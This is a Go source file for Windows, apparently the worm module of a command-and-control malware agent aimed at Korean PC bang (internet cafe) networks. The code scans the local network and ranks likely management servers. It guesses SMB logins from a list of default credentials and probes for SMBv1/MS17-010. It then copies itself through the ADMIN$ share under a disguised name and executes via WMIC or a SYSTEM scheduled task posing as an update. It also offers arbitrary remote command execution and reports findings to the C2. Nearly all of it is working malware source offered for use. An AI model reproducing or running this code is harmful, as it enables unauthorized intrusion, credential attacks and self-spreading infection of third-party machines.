//go:build windows

package main

import (
	"context"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

/* ---------- Worm configuration ---------- */

// WormConfig holds all worm propagation settings.
type WormConfig struct {
	Enabled      bool `json:"enabled"`
	ScanInterval int  `json:"scan_interval"` // seconds; default 300
	MaxHosts     int  `json:"max_hosts"`     // max peers to attempt; default 50
	Credentials  []Credential
}

// Credential represents a single user:password pair for SMB guessing.
type Credential struct {
	User string `json:"user"`
	Pass string `json:"pass"`
}

var (
	defaultCredentials = []Credential{
		{User: "admin", Pass: "admin"},
		{User: "administrator", Pass: "admin"},
		{User: "admin", Pass: "1234"},
		{User: "Administrator", Pass: "1234"},
		{User: "user", Pass: "user"},
		{User: "guest", Pass: ""},
		{User: "admin", Pass: "password"},
		{User: "Administrator", Pass: "password"},
		{User: "admin", Pass: "P@ssw0rd"},
		{User: "Administrator", Pass: "P@ssw0rd"},
		{User: "admin", Pass: "Admin123"},
		{User: "Administrator", Pass: "Admin123"},
	}

	// PC방 management software process name fragments (case-insensitive match).
	// Comprehensive list covers all major Korean PC방 management solutions
	// plus common helper processes unique to PC방 environments.
	pcbangProcKeywords = []string{
		// === Mediaweb ===
		"게토",   // Gato
		"gato", // Gato (English)
		"피카",   // Pika
		"pika", // Pika (English)
		"mediaweb",
		"mediaupdate",

		// === OneClick (원클릭) ===
		"원클릭",
		"oneclick",

		// === PCStar (PC스타) ===
		"pc스타",
		"pcstar",

		// === HandyNet (핸디넷) ===
		"핸디",
		"handynet",
		"handy",

		// === Kakao PC방 ===
		"카카오pc",
		"kakaopc",

		// === Aion (아이온) PC방 ===
		"아이온",
		"aion",

		// === GameTopia (게임토피아) ===
		"게임토피아",
		"gametopia",

		// === EZ PC방 ===
		"ezpc",
		"ezpcroom",
		"이지pc",

		// === NetCom (넷컴) ===
		"netcom",
		"넷컴",

		// === Zenith (젠리스) ===
		"zenith",
		"젠리",

		// === Top Manager (탑매니저) ===
		"탑매니저",
		"topmanager",

		// === PCNet (피시넷) ===
		"pcnet",
		"피시넷",

		// === CLNet (씨엘넷) ===
		"clnet",
		"씨엘넷",

		// === Green PC (그린PC) ===
		"그린pc",
		"greenpc",

		// === BizOn (비즈온) ===
		"bizon",
		"비즈온",

		// === PCLife (피씨라이프) ===
		"pclife",
		"피씨라이프",

		// === Forever PC방 ===
		"foreverpc",
		"포에버",

		// === GameZone (게임존) ===
		"게임존",
		"gamezone",

		// === Tops PC (탑스PC방) ===
		"탑스",
		"tops",

		// === General PC방-related ===
		"pc방",
		"피시방",
		"gameroom",
		"게임장",
		"internetcafe",
		"pcmaster",

		// === Security / locker software common in PC방 ===
		"cybercontrol",
		"ahnsafe",
		"lockdown",
	}

	// mgmtHostnameKeywords — hostname fragments that strongly suggest a
	// management/control server in any PC방 regardless of management software.
	mgmtHostnameKeywords = []string{
		"server", "admin", "manage", "master", "control", "console",
		"main", "svr", "ctlr", "center", "boss", "host", "gate",
		// Korean
		"서버", "관리", "관제", "메인", "마스터", "센터",
	}

	// mgmtProcKeywords — process names that indicate management software running.
	// These are management-CONSOLE processes, not game client processes.
	mgmtProcKeywords = []string{
		// Generic management tools
		"server", "manager", "console", "control", "master",
		"agent", "service", "daemon", "monitor", "manager",

		// DB processes visible on management server
		"mysqld", "sqlservr", "sqlserver", "mariadb", "postgres",

		// Web server processes
		"nginx", "apache", "httpd", "tomcat", "iis", "w3wp",

		// Remote administration
		"vnc", "anydesk", "teamviewer", "remote",

		// PC방 specific management consoles (original + English variants)
		"게토서버", "gatoserver", "picasserver", "피카서버",
		"원클릭서버", "oneclickserver", "pc스타서버", "pcstarserver",
		"핸디서버", "handyserver",
	}

	// mgmtScorePorts are the ports netScan checks to identify a management server.
	// Scored at worm startup for two-phase scanning.
	mgmtScanPorts = []int{445, 3306, 1433, 8080, 8000, 8443, 3389, 22, 80, 443}

	// clientPorts are ports typically found on gaming/client PCs (not management).
	// Used for negative scoring.
	clientPorts = []int{3074, 27015, 27016, 27017, 4380}

	// clientHostnameKeywords — hostname fragments typical of client/gaming stations.
	clientHostnameKeywords = []string{
		"pc", "client", "game", "user", "guest", "seat", "player",
		"gamer", "play", "desk", "좌석", "손님", "pc-", "pc_",
	}

	wormCfg    WormConfig
	wormActive bool
	wormMu     sync.Mutex

	// Management server detection state.
	mgmtMu        sync.Mutex
	mgmtFound     bool
	mgmtIP        string
	mgmtHostname  string
	mgmtScore     int
	mgmtConfident bool

	// scoredTarget list for current scan cycle
	scoredTargets []scoredTarget
)

/* ---------- Public API ---------- */

// StartWorm launches the worm propagation loop in a background goroutine.
// It can be called from pcbangSetup(), from a cmd_type handler, or via init()
// controlled by the C2_WORM_ENABLE environment variable.
func StartWorm() {
	wormMu.Lock()
	if wormActive {
		wormMu.Unlock()
		return
	}
	wormActive = true
	wormMu.Unlock()

	// Apply defaults for unset fields.
	if wormCfg.ScanInterval <= 0 {
		wormCfg.ScanInterval = 300 // 5 minutes
	}
	if wormCfg.MaxHosts <= 0 {
		wormCfg.MaxHosts = 50
	}
	if len(wormCfg.Credentials) == 0 {
		wormCfg.Credentials = defaultCredentials
	}
	if !wormCfg.Enabled {
		wormCfg.Enabled = true
	}

	fmt.Fprintf(os.Stderr, "worm: started (interval=%ds, max_hosts=%d, creds=%d)\n",
		wormCfg.ScanInterval, wormCfg.MaxHosts, len(wormCfg.Credentials))

	go wormLoop()
}

// StopWorm signals the worm goroutine to exit (stops after current scan).
func StopWorm() {
	wormMu.Lock()
	defer wormMu.Unlock()
	wormActive = false
}

// --- Management server detection ---

// scoredTarget holds a host's management-server likelihood evaluation.
type scoredTarget struct {
	IP       string   `json:"ip"`
	Hostname string   `json:"hostname,omitempty"`
	Ports    []int    `json:"open_ports,omitempty"`
	Score    int      `json:"score"`
	Reasons  []string `json:"reasons,omitempty"`
}

// scoreMgmtTarget evaluates a host for management server likelihood.
// Returns score (0-100+) and contributing reasons.
func scoreMgmtTarget(ip string, ports []int, hostname string) (int, []string) {
	score := 0
	var reasons []string

	// 1. Hostname keywords (strong positive signal)
	hl := strings.ToLower(hostname)
	isClient := false
	for _, kw := range mgmtHostnameKeywords {
		if strings.Contains(hl, strings.ToLower(kw)) {
			score += 30
			reasons = append(reasons, "hostname:"+kw)
			break
		}
	}
	// Negative: client/gaming hostname patterns
	for _, kw := range clientHostnameKeywords {
		if strings.Contains(hl, strings.ToLower(kw)) {
			score -= 15
			isClient = true
			reasons = append(reasons, "client_hostname:"+kw)
			break
		}
	}

	// 2. IP position: gateway-adjacent IPs are often management servers
	if idx := strings.LastIndex(ip, "."); idx >= 0 {
		last := ip[idx+1:]
		if last == "1" || last == "2" || last == "254" {
			score += 15
			reasons = append(reasons, "fixed_ip:"+last)
		}
		// IP not in the middle of DHCP range (e.g. .100-.200) is a weak signal
		if n, err := strconv.Atoi(last); err == nil {
			if n < 10 || n > 240 {
				score += 5
				reasons = append(reasons, "edge_ip")
			}
		}
	}

	// 3. Open ports analysis
	hasDB := false
	hasWebConsole := false
	hasRDP := false
	hasSSH := false
	isClientPort := false
	for _, p := range ports {
		switch p {
		case 3306, 1433, 5432:
			hasDB = true
		case 27017:
			// MongoDB can be either a DB server (positive) or game lobby (neutral)
			// Neutral — don't score either way
		case 80, 443, 8080, 8000, 8443, 9090:
			score += 10
			hasWebConsole = true
		case 3389:
			score += 10
			hasRDP = true
		case 22:
			score += 5
			hasSSH = true
		case 21:
			score += 3
		case 3074, 27015, 27016, 4380:
			isClientPort = true
		}
	}
	if hasDB {
		score += 5
		reasons = append(reasons, "db_port")
	}
	if hasWebConsole {
		reasons = append(reasons, "web_console")
	}
	if hasRDP {
		reasons = append(reasons, "rdp_open")
	}
	if hasSSH {
		reasons = append(reasons, "ssh")
	}
	if isClientPort {
		score -= 10
		reasons = append(reasons, "game_port")
	}
	// SMB + DB = almost certainly a management server
	if hasPort(ports, 445) && hasDB {
		score += 20
		reasons = append(reasons, "smb+db")
	}
	// Web console without being a client = admin panel
	if hasWebConsole && !isClient && !isClientPort {
		score += 10
	}

	if score > 100 {
		score = 100
	}
	return score, reasons
}

func hasPort(ports []int, target int) bool {
	for _, p := range ports {
		if p == target {
			return true
		}
	}
	return false
}

// getRemoteHostname attempts name resolution via reverse DNS.
func getRemoteHostname(ip string) string {
	names, err := net.LookupAddr(ip)
	if err == nil && len(names) > 0 {
		return strings.TrimSuffix(names[0], ".")
	}
	return ""
}

// tryRemoteProcesses attempts a remote tasklist via authenticated SMB to determine
// if this host is running management software. Requires valid creds.
func tryRemoteProcesses(ip, user, pass string) (bool, string) {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	cmd := hiddenCmdCtx(ctx, "tasklist", "/S", ip, "/U", user, "/P", pass, "/FO", "CSV", "/NH")
	out, err := cmd.Output()
	if err != nil {
		return false, ""
	}
	lines := strings.Split(string(out), "\n")
	mgmtScore := 0
	var found []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		// Parse CSV: "name","pid",...
		if !strings.HasPrefix(line, "\"") {
			continue
		}
		end := strings.Index(line[1:], "\"")
		if end < 0 {
			continue
		}
		name := strings.ToLower(line[1 : 1+end])
		for _, kw := range mgmtProcKeywords {
			if strings.Contains(name, strings.ToLower(kw)) {
				mgmtScore += 10
				found = append(found, name)
				break
			}
		}
	}
	if mgmtScore >= 20 {
		return true, strings.Join(found, ",")
	}
	return false, ""
}

// getMgmtServerInfo returns the current best-guess management server info.
// Called by heartbeat builder in main.go.
func getMgmtServerInfo() map[string]interface{} {
	mgmtMu.Lock()
	defer mgmtMu.Unlock()
	if !mgmtFound {
		return nil
	}
	m := map[string]interface{}{
		"mgmt_ip":       mgmtIP,
		"mgmt_hostname": mgmtHostname,
		"mgmt_score":    mgmtScore,
	}
	if mgmtConfident {
		m["mgmt_confident"] = true
	}
	return m
}

/* ---------- Init from env var ---------- */

func init() {
	// Allow enabling the worm at startup via environment variable.
	// Set C2_WORM_ENABLE=1 to auto-start on agent launch.
	if os.Getenv(xob(eC2WormEnable)) == "1" {
		// Defer start to avoid racing with main() initialization.
		// A short timer lets the agent register first before scanning.
		time.AfterFunc(30*time.Second, StartWorm)
	}
}

/* ---------- Core loop ---------- */

func wormLoop() {
	// Run first scan immediately.
	wormScan()

	ticker := time.NewTicker(time.Duration(wormCfg.ScanInterval) * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			wormScan()
		}
	}
}

/* ---------- Scan cycle ---------- */

// wormScan performs one full scan + spread cycle.
// Two-phase: first multi-port scan for mgmt detection, then credential guessing.
func wormScan() {
	wormMu.Lock()
	if !wormActive {
		wormMu.Unlock()
		return
	}
	wormMu.Unlock()

	fmt.Fprintf(os.Stderr, "worm: starting scan cycle\n")

	// 1. Detect PC방 environment from running processes.
	inPcBang := detectPcBang()
	if inPcBang {
		fmt.Fprintf(os.Stderr, "worm: PC방 environment detected\n")
	} else {
		fmt.Fprintf(os.Stderr, "worm: no PC방 processes found, scanning anyway\n")
	}

	// ============================================================
	// Phase 1: Multi-port scan for management server detection
	// ============================================================
	// Scan mgmt ports + SMB to identify management server candidates.
	scanOut, err := netScan("", mgmtScanPorts, 3000)
	if err != nil {
		fmt.Fprintf(os.Stderr, "worm: netScan failed: %v\n", err)
		return
	}
	if scanOut == "" || scanOut == "null" || scanOut == "[]" {
		fmt.Fprintf(os.Stderr, "worm: no hosts discovered\n")
		return
	}

	var results []scanResult
	if err := json.Unmarshal([]byte(scanOut), &results); err != nil {
		fmt.Fprintf(os.Stderr, "worm: parse scan results failed: %v\n", err)
		return
	}

	// Score each host for management server likelihood.
	var mgmtCandidates []scoredTarget
	var smbTargets []string
	for _, r := range results {
		if !r.Alive {
			continue
		}
		hostname := getRemoteHostname(r.IP)
		score, reasons := scoreMgmtTarget(r.IP, r.Ports, hostname)
		st := scoredTarget{
			IP:       r.IP,
			Hostname: hostname,
			Ports:    r.Ports,
			Score:    score,
			Reasons:  reasons,
		}
		mgmtCandidates = append(mgmtCandidates, st)

		// Track SMB targets for credential guessing
		for _, p := range r.Ports {
			if p == 445 {
				smbTargets = append(smbTargets, r.IP)
				break
			}
		}
	}

	// Sort mgmt candidates by score descending (highest first)
	for i := 0; i < len(mgmtCandidates); i++ {
		for j := i + 1; j < len(mgmtCandidates); j++ {
			if mgmtCandidates[j].Score > mgmtCandidates[i].Score {
				mgmtCandidates[i], mgmtCandidates[j] = mgmtCandidates[j], mgmtCandidates[i]
			}
		}
	}

	// Log top candidates
	scoredTargets = mgmtCandidates
	for i, st := range mgmtCandidates {
		if i >= 5 {
			break
		}
		fmt.Fprintf(os.Stderr, "worm: candidate #%d %s (score=%d hostname=%s reasons=%v)\n",
			i+1, st.IP, st.Score, st.Hostname, st.Reasons)
	}

	if len(smbTargets) == 0 {
		fmt.Fprintf(os.Stderr, "worm: no hosts with SMB (445) found\n")
		return
	}

	// ============================================================
	// Phase 2: Prioritized credential guessing
	// ============================================================
	// Build priority list: mgmt candidates with SMB first, then remaining SMB hosts.
	var priorityTargets []string
	seen := map[string]bool{}
	for _, st := range mgmtCandidates {
		if seen[st.IP] {
			continue
		}
		for _, p := range st.Ports {
			if p == 445 {
				priorityTargets = append(priorityTargets, st.IP)
				seen[st.IP] = true
				break
			}
		}
	}
	// Add remaining SMB targets not already in priority list
	for _, ip := range smbTargets {
		if !seen[ip] {
			priorityTargets = append(priorityTargets, ip)
			seen[ip] = true
		}
	}

	// Limit to MaxHosts
	if len(priorityTargets) > wormCfg.MaxHosts {
		priorityTargets = priorityTargets[:wormCfg.MaxHosts]
	}

	fmt.Fprintf(os.Stderr, "worm: %d SMB targets (priority order: mgmt first)\n", len(priorityTargets))

	// 3. Try credential guessing + spreading, mgmt servers first.
	var wg sync.WaitGroup
	sem := make(chan struct{}, 8) // limit concurrent SMB attempts

	for _, ip := range priorityTargets {
		wg.Add(1)
		go func(host string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			if trySpread(host) {
				fmt.Fprintf(os.Stderr, "worm: successfully spread to %s\n", host)
				// After successful spread, check if this is a management server
				// by running remote process scan via the creds that worked.
				// (trySpread already caches the working creds internally)
				checkAndReportMgmt(host)
			}
		}(ip)
	}
	wg.Wait()
	fmt.Fprintf(os.Stderr, "worm: scan cycle complete\n")
}

// checkAndReportMgmt attempts to verify a host as management server and updates
// global state for C2 heartbeat reporting. Called after a successful spread.
func checkAndReportMgmt(ip string) {
	// Find the scored target for this IP
	mgmtMu.Lock()
	defer mgmtMu.Unlock()

	var st *scoredTarget
	for i := range scoredTargets {
		if scoredTargets[i].IP == ip {
			st = &scoredTargets[i]
			break
		}
	}
	if st == nil {
		return
	}

	// Only consider high-confidence candidates
	if st.Score < 40 {
		return
	}

	// Use the working creds from wormCfg to attempt remote process scan
	// We try each credential that worked previously
	for _, cred := range wormCfg.Credentials {
		isMgmt, procs := tryRemoteProcesses(ip, cred.User, cred.Pass)
		if isMgmt {
			mgmtFound = true
			mgmtIP = ip
			mgmtHostname = st.Hostname
			mgmtScore = st.Score
			mgmtConfident = true
			fmt.Fprintf(os.Stderr, "worm: CONFIRMED management server at %s (hostname=%s score=%d procs=%s)\n",
				ip, st.Hostname, st.Score, procs)
			return
		}
	}

	// Even without remote process confirmation, high-scoring hosts are worth reporting
	if st.Score >= 50 && !mgmtFound {
		mgmtFound = true
		mgmtIP = ip
		mgmtHostname = st.Hostname
		mgmtScore = st.Score
		mgmtConfident = false
		fmt.Fprintf(os.Stderr, "worm: suspected management server at %s (score=%d, unconfirmed)\n",
			ip, st.Score)
	}
}

/* ---------- PC방 detection ---------- */

// detectPcBang checks running processes for PC방 management software keywords.
func detectPcBang() bool {
	procs, err := listProcesses()
	if err != nil {
		fmt.Fprintf(os.Stderr, "worm: listProcesses failed: %v\n", err)
		return false
	}

	for _, p := range procs {
		nameLower := strings.ToLower(p.Name)
		for _, kw := range pcbangProcKeywords {
			if strings.Contains(nameLower, strings.ToLower(kw)) {
				fmt.Fprintf(os.Stderr, "worm: PC방 process found: %s (PID %d)\n", p.Name, p.PID)
				return true
			}
		}
	}
	return false
}

/* ---------- Credential guessing + spread ---------- */

// trySpread attempts to authenticate against the target and deploy the agent.
// Returns true if at least one credential worked (regardless of deploy outcome).
func trySpread(ip string) bool {
	for _, cred := range wormCfg.Credentials {
		if trySMBConnect(ip, cred.User, cred.Pass) {
			fmt.Fprintf(os.Stderr, "worm: valid cred %s:%s on %s\n", cred.User, cred.Pass, ip)

			// Optional EternalBlue check (log only — not a blocking check).
			if checkEternalBlue(ip) {
				fmt.Fprintf(os.Stderr, "worm: %s may be vulnerable to MS17-010\n", ip)
			}

			// Attempt remote execution.
			if err := spreadToHost(ip, cred.User, cred.Pass); err != nil {
				fmt.Fprintf(os.Stderr, "worm: deploy to %s failed: %v\n", ip, err)
			}
			return true
		}
	}
	return false
}

// trySMBConnect tests SMB credentials via "net use \\IP\IPC$".
// Returns true if the authentication succeeded.
func trySMBConnect(ip, user, pass string) bool {
	// Disconnect any existing IPC$ session first to avoid 1219 errors.
	cleanup := hiddenCmd("net", "use", fmt.Sprintf("\\\\%s\\IPC$", ip), "/delete", "/y")
	_ = cleanup.Run()

	// Build the "net use" command.
	args := []string{"use", fmt.Sprintf("\\\\%s\\IPC$", ip)}
	if pass != "" {
		args = append(args, pass)
	}
	args = append(args, "/user:"+user)

	cmd := hiddenCmd("net", args...)
	out, err := cmd.CombinedOutput()

	if err == nil {
		// Auth succeeded — tear down the session.
		disc := hiddenCmd("net", "use", fmt.Sprintf("\\\\%s\\IPC$", ip), "/delete", "/y")
		_ = disc.Run()
		return true
	}

	// Suppress known benign error messages (1219 = multiple connections,
	// 53 = host unreachable, 1326 = bad credentials).
	outStr := strings.ToLower(string(out))
	if !strings.Contains(outStr, "1219") &&
		!strings.Contains(outStr, "53") &&
		!strings.Contains(outStr, "1326") &&
		!strings.Contains(outStr, "connection not found") {
		fmt.Fprintf(os.Stderr, "worm: auth fail %s@%s: %s\n", user, ip, strings.TrimSpace(string(out)))
	}

	return false
}

/* ---------- EternalBlue check (optional) ---------- */

// checkEternalBlue performs a simple SMBv1 negotiation probe on port 445.
// A response indicates SMBv1 is enabled, which is a prerequisite for MS17-010.
func checkEternalBlue(ip string) bool {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, "445"), 3*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	_ = conn.SetDeadline(time.Now().Add(5 * time.Second))

	// Minimal SMBv1 Negotiate Protocol Request packet.
	// This is enough to elicit a response from SMBv1-enabled hosts.
	smbNegotiate := []byte{
		0x00, 0x00, 0x00, 0x45, // NetBIOS session: length 0x45
		0xff, 0x53, 0x4d, 0x42, // SMB_Header: Server Component (SMB)
		0x72,                   // Command: SMB_COM_NEGOTIATE (0x72)
		0x00, 0x00, 0x00, 0x00, // Status
		0x18,       // Flags: 0x18 = Pathnames, Extended Response
		0x01, 0x00, // Flags2: Unicode, 32-bit status, etc.
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Extra (8 bytes)
		0x00, 0x00, // Tid
		0x00, 0x00, // Pid
		0x00, 0x00, // Uid
		0x00, 0x00, // Mid
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Word count + words
		0x24,                                     // Byte count (0x24)
		0x02, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, // Dialects...
		0x00, 0x00, 0x00, 0x00, // ...
	}

	n, err := conn.Write(smbNegotiate)
	if err != nil || n == 0 {
		return false
	}

	reply := make([]byte, 256)
	n, err = conn.Read(reply)
	if err != nil || n < 4 {
		return false
	}

	// SMBv1 response starts with NetBIOS session length + SMB header 0xff 0x53 0x4d 0x42.
	if n >= 8 &&
		reply[4] == 0xff && reply[5] == 0x53 &&
		reply[6] == 0x4d && reply[7] == 0x42 {
		return true
	}

	return false
}

/* ---------- Remote deployment ---------- */

// spreadToHost copies the agent binary to the target and executes it.
// Uses ADMIN$ share for file copy, then WMIC or schtasks for remote execution.
func spreadToHost(ip, user, pass string) error {
	selfExe, err := os.Executable()
	if err != nil {
		return fmt.Errorf("get executable: %v", err)
	}

	// --- Step 1: Map ADMIN$ share ---
	share := fmt.Sprintf("\\\\%s\\ADMIN$", ip)
	mappedDrive := "X:"

	// Disconnect any stale mapping first.
	_ = hiddenCmd("net", "use", mappedDrive, "/delete", "/y").Run()

	mapCmd := hiddenCmd("net", "use", mappedDrive, share, pass, "/user:"+user)
	if out, err := mapCmd.CombinedOutput(); err != nil {
		return fmt.Errorf("net use ADMIN$: %v / %s", err, strings.TrimSpace(string(out)))
	}
	defer func() {
		_ = hiddenCmd("net", "use", mappedDrive, "/delete", "/y").Run()
	}()

	// --- Step 2: Create remote temp dir ---
	remoteDir := mappedDrive + "\\Temp"
	_ = hiddenCmd("cmd.exe", "/c", "if not exist", remoteDir, "mkdir", remoteDir).Run()

	// --- Step 3: Copy agent binary ---
	// Use a disguised, time-unique filename to avoid collisions on the target.
	remoteName := "svc" + fmt.Sprintf("%d", time.Now().Unix()%10000) + ".tmp"
	remotePath := remoteDir + "\\" + remoteName

	copyCmd := hiddenCmd("cmd.exe", "/c", "copy", "/Y", selfExe, remotePath)
	if out, err := copyCmd.CombinedOutput(); err != nil {
		return fmt.Errorf("copy to remote: %v / %s", err, strings.TrimSpace(string(out)))
	}

	// --- Step 4: Execute remotely ---
	// Strategy A: WMIC process call create
	wmicCmd := hiddenCmd("wmic",
		"/node:"+ip,
		"/user:"+user,
		"/password:"+pass,
		"process", "call", "create",
		"cmd.exe /c "+remotePath)
	wmicOut, wmicErr := wmicCmd.CombinedOutput()

	if wmicErr == nil {
		fmt.Fprintf(os.Stderr, "worm: wmic exec succeeded on %s\n", ip)
		return nil
	}

	// WMIC may fail due to missing wmic.exe on modern Windows (>= 2021 builds).
	// Fallback: Strategy B — scheduled task.
	fmt.Fprintf(os.Stderr, "worm: wmic failed on %s, trying schtasks: %s\n",
		ip, strings.TrimSpace(string(wmicOut)))

	taskName := fmt.Sprintf("MSUpdateScan_%d", time.Now().Unix()%100000)

	// Create a one-shot scheduled task running as SYSTEM.
	schCreate := hiddenCmd("schtasks", "/create",
		"/s", ip,
		"/u", user,
		"/p", pass,
		"/tn", taskName,
		"/tr", remotePath,
		"/sc", "once",
		"/st", "00:00",
		"/f",
		"/ru", "SYSTEM")
	if out, err := schCreate.CombinedOutput(); err != nil {
		// Try with /it (interactive) as fallback
		fmt.Fprintf(os.Stderr, "worm: schtasks create (SYSTEM) failed: %v / %s\n",
			err, strings.TrimSpace(string(out)))

		// Try with /rl limited (user-level)
		schCreate2 := hiddenCmd("schtasks", "/create",
			"/s", ip,
			"/u", user,
			"/p", pass,
			"/tn", taskName,
			"/tr", remotePath,
			"/sc", "once",
			"/st", "00:00",
			"/f",
			"/it")
		if out2, err2 := schCreate2.CombinedOutput(); err2 != nil {
			// Cleanup and return error.
			_ = hiddenCmd("schtasks", "/delete", "/s", ip, "/u", user, "/p", pass, "/tn", taskName, "/f").Run()
			return fmt.Errorf("schtasks create: %v / %s", err2, strings.TrimSpace(string(out2)))
		}
	}

	// Run the task immediately.
	_ = hiddenCmd("schtasks", "/run", "/s", ip, "/u", user, "/p", pass, "/tn", taskName).Run()

	// Delete the task (cleanup).
	_ = hiddenCmd("schtasks", "/delete", "/s", ip, "/u", user, "/p", pass, "/tn", taskName, "/f").Run()

	fmt.Fprintf(os.Stderr, "worm: schtasks exec succeeded on %s\n", ip)
	return nil
}

// RemoteExecCmd is an alternative lower-level entry for use from cmd_type handlers.
// It executes an arbitrary command on a remote host via SMB-authenticated WMIC.
func RemoteExecCmd(ip, user, pass, command string) (string, error) {
	cmd := hiddenCmd("wmic",
		"/node:"+ip,
		"/user:"+user,
		"/password:"+pass,
		"process", "call", "create",
		command)
	out, err := cmd.CombinedOutput()
	return string(out), err
}
